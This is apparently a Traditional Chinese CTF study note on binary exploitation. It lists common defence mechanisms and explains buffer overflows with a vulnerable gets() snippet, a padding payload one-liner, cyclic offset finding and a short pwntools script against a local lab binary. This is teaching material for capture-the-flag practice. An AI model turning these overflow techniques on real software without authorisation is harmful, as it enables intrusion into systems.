## Pwn（Binary Exploitation）

Pwn 是 CTF 中的二進位漏洞利用題型，重點在於理解程式記憶體結構、漏洞觸發點與控制流程等技巧。常見攻擊包含 Buffer Overflow、Format String、ROP、Heap Exploitation 等。

---

### 基本結構與流程

#### 執行流程簡述
1. 使用者執行二進位檔（Binary）
2. 作業系統載入 ELF，初始化堆疊與記憶體
3. 開始執行 `main` 函數，依序執行程式邏輯
4. 若發生漏洞，可透過特定輸入觸發控制流程改變

#### 常見安全機制（防禦機制）

| 機制          | 說明                                                   |
|---------------|--------------------------------------------------------|
| NX            | 記憶體區段不可執行（No eXecute），防止 Shellcode 執行 |
| PIE           | 程式載入位址隨機化（Position Independent Executable） |
| ASLR          | 記憶體佈局隨機化（Address Space Layout Randomization）|
| Stack Canary  | 堆疊保護，檢查返回位址前的 canary 值有無被覆蓋        |
| RELRO         | GOT 表寫入保護（Partial / Full RELRO）                |

使用 `checksec` 工具查看目標程式防禦狀態：
```bash
checksec binary
```

---

## 漏洞類型與利用技巧

### Buffer Overflow（緩衝區溢位）

#### 攻擊原理
- 利用超出緩衝區大小的輸入覆蓋關鍵變數或返回位址。

#### 常見利用手法
- 覆蓋 return address → 劫持程式流程
- 修改函數指標或跳轉點
- 配合 Shellcode、ROP 等技術達成任意執行

#### 基本利用範例
```c
char buf[32];
gets(buf);  // 無邊界檢查，容易 BOF
```

使用 Python 產生 payload：
```bash
python3 -c "print('A'*40 + '\xef\xbe\xad\xde')" > payload
```

#### 工具技巧
- `cyclic`：產生不重複 pattern
- `pattern_offset`：找出 offset 偏移位置
```bash
cyclic 100
pattern_offset -q 6161616c
```

- 使用 pwntools 撰寫利用腳本：
```python
from pwn import *

p = process('./vuln')
payload = b'A' * 40 + p64(0xdeadbeef)
p.sendline(payload)
p.interactive()
```
